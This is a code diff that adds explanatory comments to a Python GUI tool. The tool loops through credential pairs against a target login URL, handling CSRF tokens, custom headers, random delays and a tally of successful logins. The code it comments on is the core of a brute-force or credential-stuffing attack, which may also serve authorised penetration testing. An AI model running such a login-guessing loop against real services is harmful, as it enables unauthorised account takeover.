@@ -97,7 +97,7 @@ def set_headers(header_mode, header_values_list, username, usernames):
     return headers
 
 def execute_login(header_mode, target_url, usernames, passwords, header_values_list):
-    global is_cancelled  # Add this line to declare is_cancelled as global
+    global is_cancelled  # Declaring is_cancelled as global
     session = requests.Session()
     successful_logins = []
     attempt_count = 0
@@ -127,19 +127,23 @@ def execute_login(header_mode, target_url, usernames, passwords, header_values_l
     total_attempts = len(credential_pairs)
     progress['maximum'] = total_attempts
 
+    # Iterate through each credential pair
     for username, password in credential_pairs:
         if is_cancelled:
             break
 
+        # Attempt to log in with current credentials
         csrf_token = get_csrf_token(session, target_url)
         headers = set_headers(header_mode, header_values_list, username, usernames)
         headers['X-CSRFToken'] = csrf_token
         success = attempt_login(session, target_url, username, password, headers)
 
+        # Update counters and GUI elements
         attempt_count += 1
         progress['value'] = attempt_count
         root.update_idletasks()
 
+        # Log successful or unsuccessful attempts
         if success:
             successful_attempts += 1
             successful_logins.append((username, password))
@@ -156,6 +160,7 @@ def execute_login(header_mode, target_url, usernames, passwords, header_values_l
         except ValueError:
             messagebox.showerror("Invalid Delay", "Please enter valid numbers for min and max delay.")
             return
+    # Cancel operation if flagged
     if is_cancelled:
         messagebox.showinfo("Cancelled", f"{attempt_count} login attempts completed.\n"
                                           f"Successful attempts: {successful_attempts}\n"
@@ -165,6 +170,7 @@ def execute_login(header_mode, target_url, usernames, passwords, header_values_l
         messagebox.showinfo("Completed", f"All {attempt_count} login attempts completed.\n"
                                           f"Successful attempts: {successful_attempts}\n"
                                           f"Unsuccessful attempts: {unsuccessful_attempts}")
+    # Update counters and GUI elements
     progress['value'] = 0
     start_button.config(state=NORMAL)
     cancel_button.config(state=DISABLED)
